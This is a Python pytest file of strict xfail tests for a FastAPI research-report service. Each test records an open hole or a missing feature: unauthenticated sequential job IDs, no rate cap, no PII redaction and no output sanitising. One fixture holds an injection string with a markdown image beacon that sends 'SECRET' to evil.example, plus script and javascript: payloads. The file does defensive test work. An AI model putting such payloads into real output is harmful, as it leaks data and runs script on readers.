"""Behaviours the project documents as PLANNED (CLAUDE.md phases 3-4) or that the audit missed, written as the test they will have to pass.
Every test here is xfail(strict=True) and is NOT coverage: it records that the feature does not exist / the hole is open.
Strict means the build fails the day one starts passing, so the xfail must be removed and the test becomes a real regression test.
Real FastAPI app over ASGI and real Postgres; the only replaced piece is the background pipeline launcher (as in tests/api)."""
import pytest

from app.models import Claim, Job, Source
from app.reporter import generate_markdown_report
from tests.api.test_endpoints import AUTH, _job, client  # noqa: F401  (fixture re-export)

pytestmark = pytest.mark.int
Q = "what is the efficiency of perovskite cells?"


# ---------------------------------------------------------------- NEW-1: job endpoints have no auth, ids are sequential
@pytest.mark.xfail(strict=True, reason="NEW-1 OPEN (design): GET /jobs/{id}/report etc. need no credentials; ids are sequential ints (IDOR)")
@pytest.mark.asyncio
@pytest.mark.parametrize("path", ["/jobs/{id}", "/jobs/{id}/report", "/jobs/{id}/claims", "/jobs/{id}/ledger"])
async def test_NEW_1_reading_a_job_without_credentials_is_rejected(client, path):  # noqa: F811
    jid = await _job(client, question="a private question about my medical history")
    r = await client.get(path.format(id=jid))
    assert r.status_code in (401, 403), f"{path} returned {r.status_code} to an anonymous caller"


@pytest.mark.xfail(strict=True, reason="NEW-1 OPEN (design): anyone can cancel anyone's job")
@pytest.mark.asyncio
async def test_NEW_1_cancelling_a_job_without_credentials_is_rejected(client):  # noqa: F811
    jid = await _job(client, status="running")
    r = await client.post(f"/jobs/{jid}/cancel")
    assert r.status_code in (401, 403)


# ---------------------------------------------------------------- FEATURE ABSENT: API reliability controls (Phase 4)
@pytest.mark.xfail(strict=True, reason="FEATURE ABSENT: no Idempotency-Key support on POST /research")
@pytest.mark.asyncio
async def test_GAP_same_idempotency_key_creates_one_job(client):  # noqa: F811
    h = {"Idempotency-Key": "abc-123"}
    a = await client.post("/research", json={"question": Q}, headers=h)
    b = await client.post("/research", json={"question": Q}, headers=h)
    assert a.status_code == 202 and b.json()["job_id"] == a.json()["job_id"]


@pytest.mark.xfail(strict=True, reason="FEATURE ABSENT: no queue-depth cap / 429 + Retry-After on POST /research")
@pytest.mark.asyncio
async def test_GAP_queue_depth_cap_returns_429_with_retry_after(client):  # noqa: F811
    codes, retry = [], None
    for _ in range(100):
        r = await client.post("/research", json={"question": Q})
        codes.append(r.status_code)
        if r.status_code == 429:
            retry = r.headers.get("Retry-After")
            break
    assert 429 in codes and retry is not None, "100 queued jobs from one caller were all accepted"


@pytest.mark.xfail(strict=True, reason="FEATURE ABSENT: no DELETE /jobs/{id}")
@pytest.mark.asyncio
async def test_GAP_delete_job_removes_it(client):  # noqa: F811
    jid = await _job(client, status="done")
    r = await client.delete(f"/jobs/{jid}", headers=AUTH)
    assert r.status_code in (200, 202, 204)
    assert (await client.get(f"/jobs/{jid}")).status_code == 404


# ---------------------------------------------------------------- FEATURE ABSENT: output guard and PII (Phase 3)
@pytest.mark.xfail(strict=True, reason="FEATURE ABSENT: reporter does not sanitize markdown/HTML; a snapshot span becomes report text verbatim")
@pytest.mark.asyncio
async def test_GAP_report_does_not_emit_image_links_or_raw_html_from_source_text(sm_factory):
    sm = sm_factory()
    evil = 'Totals ![x](https://evil.example/collect?d=SECRET) and <script>alert(1)</script> and [a](javascript:alert(1)) done.'
    async with sm() as s:
        job = Job(question=Q, status="done")
        s.add(job)
        await s.flush()
        src = Source(job_id=job.id, url="http://example.org/p", domain="example.org", content_hash="h", snapshot=evil)
        s.add(src)
        await s.flush()
        s.add(Claim(job_id=job.id, source_id=src.id, text="Totals were reported.", quote=evil, start_char=0, end_char=len(evil),
                    final_status="kept", entailment="supports"))
        await s.commit()
        report = await generate_markdown_report(s, job.id)
    assert "![" not in report and "<script" not in report.lower() and "javascript:" not in report.lower()


@pytest.mark.xfail(strict=True, reason="FEATURE ABSENT: no PII detection/redaction; the raw question is stored and rendered")
@pytest.mark.asyncio
async def test_GAP_pii_in_a_question_is_not_stored_or_rendered_raw(client):  # noqa: F811
    pii = "ravi.kumar@example.com"
    r = await client.post("/research", json={"question": f"Why did {pii} get flagged by the bank last week?"})
    jid = r.json()["job_id"]
    async with client.sm() as s:
        j = await s.get(Job, jid)
        stored = j.question
        report = await generate_markdown_report(s, jid)
    assert pii not in stored and pii not in report
